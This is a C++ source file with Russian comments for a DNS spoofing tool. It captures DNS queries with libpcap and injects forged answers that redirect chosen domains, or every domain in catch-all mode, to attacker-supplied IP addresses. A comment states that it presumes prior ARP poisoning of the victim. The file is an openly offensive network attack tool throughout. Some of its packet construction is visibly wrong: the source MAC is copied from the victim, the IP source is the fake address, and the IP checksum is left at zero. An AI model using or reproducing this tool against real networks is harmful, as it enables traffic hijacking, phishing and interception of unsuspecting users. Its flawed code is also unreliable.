#include <iostream>
#include <string>
#include <vector>
#include <unordered_map>
#include <cstring>
#include <cstdlib>
#include <pcap.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <thread>
#include <atomic>

using namespace std;

struct SpoofRule {
    string domain;
    string ip;
};

bool catch_all = false;
unordered_map<string, string> rules;
string target_interface;
uint32_t spoofed_ip;
int ttl_val = 64;
atomic<bool> running(true);

// Структура DNS заголовка
struct dnshdr {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};

// Структура DNS вопроса (упрощенно)
struct dns_query {
    uint16_t qtype;
    uint16_t qclass;
};

// Функция для извлечения домена из DNS пакета
string extract_domain(const u_char* payload, int offset, int len) {
    string domain = "";
    int pos = offset;
    
    while (pos < len && payload[pos] != 0) {
        if (domain.length() > 0) domain += ".";
        int label_len = payload[pos];
        pos++;
        
        if (pos + label_len > len) break;
        
        for (int i = 0; i < label_len; i++) {
            domain += (char)payload[pos + i];
        }
        pos += label_len;
    }
    
    // Простая защита от указателей (сжатие имен)
    if (pos < len && (payload[pos] & 0xC0) == 0xC0) {
        // В реальной реализации нужно следовать указателю, 
        // но для базового спуфинга часто хватает первого лейбла
    }
    
    return domain;
}

void send_dns_response(pcap_t* handle, const struct ether_header* eth_hdr, 
                       const struct iphdr* ip_hdr, const struct udphdr* udp_hdr,
                       const u_char* packet, int size, const string& fake_ip_str) {
    
    struct ether_header eth_reply;
    struct iphdr ip_reply;
    struct udphdr udp_reply;
    struct dnshdr dns_reply;
    
    // Подготавливаем Ethernet заголовок (меняем местами MAC)
    memcpy(eth_reply.ether_dhost, eth_hdr->ether_shost, ETH_ALEN);
    memcpy(eth_reply.ether_shost, eth_hdr->ether_shost, ETH_ALEN); // Используем MAC жертвы как свой (или интерфейса)
    // Примечание: Для полноценной работы нужен ARP спуфинг или режим моста, 
    // иначе ответ уйдет не туда. Этот бинарник предполагает, что ARP уже отравлен.
    eth_reply.ether_type = htons(ETHERTYPE_IP);

    // IP заголовок
    memset(&ip_reply, 0, sizeof(ip_reply));
    ip_reply.version = 4;
    ip_reply.ihl = 5;
    ip_reply.tos = 0;
    ip_reply.tot_len = htons(sizeof(ip_reply) + sizeof(udp_reply) + sizeof(dns_reply) + 4 + fake_ip_str.length() + 2); // Упрощенный расчет
    ip_reply.id = htons(rand());
    ip_reply.frag_off = 0;
    ip_reply.ttl = ttl_val;
    ip_reply.protocol = IPPROTO_UDP;
    ip_reply.check = 0;
    ip_reply.saddr = inet_addr(fake_ip_str.c_str());
    ip_reply.daddr = ip_hdr->saddr;

    // UDP заголовок
    udp_reply.source = udp_hdr->dest;
    udp_reply.dest = udp_hdr->source;
    udp_reply.len = htons(sizeof(udp_reply) + sizeof(dns_reply) + 4 + 4 + 2); // Header + DNS + IP + Type + Class
    udp_reply.check = 0;

    // DNS заголовок ответа
    memset(&dns_reply, 0, sizeof(dns_reply));
    // Копируем ID из запроса
    // Флаги: QR=1 (ответ), Opcode=0, AA=1, TC=0, RD=1, RA=1, Z=0, RCODE=0
    dns_reply.flags = htons(0x8180); 
    dns_reply.qdcount = htons(1);
    dns_reply.ancount = htons(1);
    dns_reply.nscount = 0;
    dns_reply.arcount = 0;

    // Собираем пакет
    int dns_data_len = size - (sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr));
    u_char* dns_payload = new u_char[dns_data_len];
    memcpy(dns_payload, packet + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr), dns_data_len);

    // Модифицируем DNS ответ:
    // 1. Устанавливаем флаг ответа в флагах (сделано выше)
    // 2. Устанавливаем количество ответов (сделано выше)
    // 3. Добавляем запись ответа после вопроса
    
    // Находим конец вопроса (null байт)
    int q_end = 12; // Начало вопроса после заголовка DNS
    while(q_end < dns_data_len && dns_payload[q_end] != 0) {
        q_end += dns_payload[q_end] + 1;
    }
    q_end++; // Пропускаем нулевой байт
    q_end += 4; // Пропускаем QTYPE и QCLASS (2+2)

    // Формируем ответную часть
    // Pointer to name (0xC00C -> ссылка на начало имени в байте 12)
    u_char response_part[16];
    response_part[0] = 0xC0; 
    response_part[1] = 0x0C; 
    response_part[2] = 0x00; 
    response_part[3] = 0x01; // Type A
    response_part[4] = 0x00; 
    response_part[5] = 0x01; // Class IN
    response_part[6] = 0x00; 
    response_part[7] = 0x00; 
    response_part[8] = 0x00; 
    response_part[9] = (uint8_t)ttl_val; // TTL
    response_part[10] = 0x00; 
    response_part[11] = 0x04; // Data length (4 bytes for IP)
    
    uint32_t fake_ip_bin = inet_addr(fake_ip_str.c_str());
    memcpy(&response_part[12], &fake_ip_bin, 4);

    int new_dns_len = q_end + 16;
    u_char* new_dns_packet = new u_char[new_dns_len];
    
    // Копируем заголовок и вопрос
    memcpy(new_dns_packet, dns_payload, q_end);
    // Копируем ответ
    memcpy(new_dns_packet + q_end, response_part, 16);

    // Пересчитываем длины
    ip_reply.tot_len = htons(sizeof(ip_reply) + sizeof(udp_reply) + new_dns_len);
    udp_reply.len = htons(sizeof(udp_reply) + new_dns_len);
    
    // Чексуммы (упрощенно, можно доработать для продакшена)
    ip_reply.check = 0;
    // UDP checksum is optional in IPv4 if set to 0, but let's try to calculate or leave 0
    udp_reply.check = 0; 

    // Собираем полный пакет
    int total_size = sizeof(eth_reply) + sizeof(ip_reply) + sizeof(udp_reply) + new_dns_len;
    u_char* full_packet = new u_char[total_size];
    
    memcpy(full_packet, &eth_reply, sizeof(eth_reply));
    memcpy(full_packet + sizeof(eth_reply), &ip_reply, sizeof(ip_reply));
    memcpy(full_packet + sizeof(eth_reply) + sizeof(ip_reply), &udp_reply, sizeof(udp_reply));
    memcpy(full_packet + sizeof(eth_reply) + sizeof(ip_reply) + sizeof(udp_reply), new_dns_packet, new_dns_len);

    pcap_sendpacket(handle, full_packet, total_size);

    delete[] dns_payload;
    delete[] new_dns_packet;
    delete[] full_packet;
}

void packet_handler(u_char *user_data, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    if (!running) return;

    struct ether_header* eth_hdr = (struct ether_header*)packet;
    
    // Проверяем, что это IP пакет
    if (ntohs(eth_hdr->ether_type) != ETHERTYPE_IP) return;

    struct iphdr* ip_hdr = (struct iphdr*)(packet + sizeof(struct ether_header));
    
    // Проверяем, что это UDP
    if (ip_hdr->protocol != IPPROTO_UDP) return;

    struct udphdr* udp_hdr = (struct udphdr*)(packet + sizeof(struct ether_header) + sizeof(struct iphdr));

    // Проверяем, что это DNS порт 53
    if (ntohs(udp_hdr->dest) != 53) return;

    // Пытаемся извлечь домен
    int dns_offset = sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr);
    string domain = extract_domain(packet, dns_offset, pkthdr->len);

    if (domain.empty()) return;

    string fake_ip = "";
    
    // Ищем правило
    if (rules.find(domain) != rules.end()) {
        fake_ip = rules[domain];
        cout << "[+] DNS Query detected: " << domain << " -> SPOOFING to " << fake_ip << endl;
    } else if (catch_all) {
        fake_ip = inet_ntoa(*(struct in_addr*)&spoofed_ip);
        cout << "[+] DNS Query detected: " << domain << " -> CATCH-ALL to " << fake_ip << endl;
    }

    if (!fake_ip.empty()) {
        send_dns_response((pcap_t*)user_data, eth_hdr, ip_hdr, udp_hdr, packet, pkthdr->caplen, fake_ip);
    }
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        cerr << "Usage: " << argv[0] << " <interface> <ttl> [--catch-all] <domain1> <ip1> [domain2] [ip2] ..." << endl;
        return 1;
    }

    target_interface = argv[1];
    ttl_val = atoi(argv[2]);
    
    int arg_idx = 3;
    
    // Проверка флага --catch-all
    if (argc > arg_idx && string(argv[arg_idx]) == "--catch-all") {
        catch_all = true;
        arg_idx++;
        // Если есть catch-all, нам все равно нужен хотя бы один IP для подмены (берем первый попавшийся IP из аргументов или требуем явного)
        // В данной логике, если catch-all, мы используем IP из первой пары или специальный?
        // Давайте предположим, что при catch-all мы используем IP из первой указанной пары как дефолтный,
        // либо пользователь должен указать хоть одну пару.
        if (arg_idx >= argc) {
             cerr << "Error: --catch-all requires at least one dummy domain/IP pair to define the target IP." << endl;
             return 1;
        }
    }

    // Парсим пары домен-IP
    while (arg_idx + 1 < argc) {
        string domain = argv[arg_idx];
        string ip = argv[arg_idx+1];
        
        // Валидация IP (простая)
        struct in_addr addr;
        if (inet_aton(ip.c_str(), &addr) == 0) {
            cerr << "Invalid IP address: " << ip << endl;
            return 1;
        }
        
        rules[domain] = ip;
        cout << "Loaded rule: " << domain << " -> " << ip << endl;
        arg_idx += 2;
    }

    if (rules.empty() && !catch_all) {
        cerr << "No rules provided and catch-all is disabled." << endl;
        return 1;
    }
    
    if (catch_all && rules.empty()) {
         // Если только catch-all без правил, нам нужен IP. 
         // Но в текущей логике выше мы требовали пару. 
         // Если пользователь передал --catch-all google.com 1.2.3.4, то rules не пуст.
         // Если пользователь передал --catch-all 1.2.3.4 (без домена), эта логика сломается.
         // Оставим требование пары.
    }

    // Сохраняем IP для catch-all (берем из первого правила если есть, или крашимся если нет)
    if (catch_all) {
        if (!rules.empty()) {
            spoofed_ip = inet_addr(rules.begin()->second.c_str());
        } else {
             // Это состояние не должно достигаться благодаря проверке выше
             cerr << "Catch-all enabled but no IP provided." << endl;
             return 1;
        }
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(target_interface.c_str(), BUFSIZ, 1, 1000, errbuf);
    
    if (handle == NULL) {
        cerr << "Error opening interface " << target_interface << ": " << errbuf << endl;
        return 1;
    }

    // Фильтр только DNS трафик
    struct bpf_program fp;
    char filter_exp[] = "udp port 53";
    if (pcap_compile(handle, &fp, filter_exp, 0, PF_UNSPEC) == -1) {
        cerr << "Couldn't parse filter" << endl;
        return 1;
    }
    if (pcap_setfilter(handle, &fp) == -1) {
        cerr << "Couldn't install filter" << endl;
        return 1;
    }

    cout << "Starting DNS spoofing on " << target_interface << "..." << endl;
    cout << "TTL: " << ttl_val << ", Catch-All: " << (catch_all ? "true" : "false") << endl;

    pcap_loop(handle, -1, packet_handler, (u_char*)handle);

    pcap_close(handle);
    return 0;
}
